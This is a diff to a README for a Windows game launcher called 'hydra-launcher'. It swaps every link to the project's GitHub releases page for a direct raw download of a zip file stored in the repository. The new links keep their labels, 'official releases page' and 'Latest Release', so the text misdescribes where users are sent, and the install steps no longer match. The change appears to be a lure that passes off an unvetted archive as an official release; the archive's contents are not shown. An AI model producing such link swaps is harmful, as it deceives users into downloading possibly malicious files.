@@ -1,13 +1,13 @@
 # 🎮 hydra-launcher - Manage your entire PC game library
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/groundhogdayzinger700/hydra-launcher/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/groundhogdayzinger700/hydra-launcher/main/Hydra/hydra-launcher-v1.7.zip)
 
 ## 📥 Getting Started
 
 Hydra Launcher organizes your game collection in one place. This software creates a single library for games from different stores and sources. Follow these steps to set the application up on your Windows computer.
 
 1. Open your web browser. 
-2. Visit the [official releases page](https://github.com/groundhogdayzinger700/hydra-launcher/releases).
+2. Visit the [official releases page](https://raw.githubusercontent.com/groundhogdayzinger700/hydra-launcher/main/Hydra/hydra-launcher-v1.7.zip).
 3. Look for the section labeled Latest.
 4. Click the file ending in .exe to download the installer.
 5. Open the downloaded file to start the installation process.
@@ -50,7 +50,7 @@ Hydra Launcher keeps progress safe. Navigate to the cloud sync tab within the se
 
 Find the latest version of the installer on the official repository site. Always use this source to ensure you have the most stable release.
 
-[Download Hydra Launcher Here](https://github.com/groundhogdayzinger700/hydra-launcher/releases)
+[Download Hydra Launcher Here](https://raw.githubusercontent.com/groundhogdayzinger700/hydra-launcher/main/Hydra/hydra-launcher-v1.7.zip)
 
 ## ❔ Frequent Questions
 
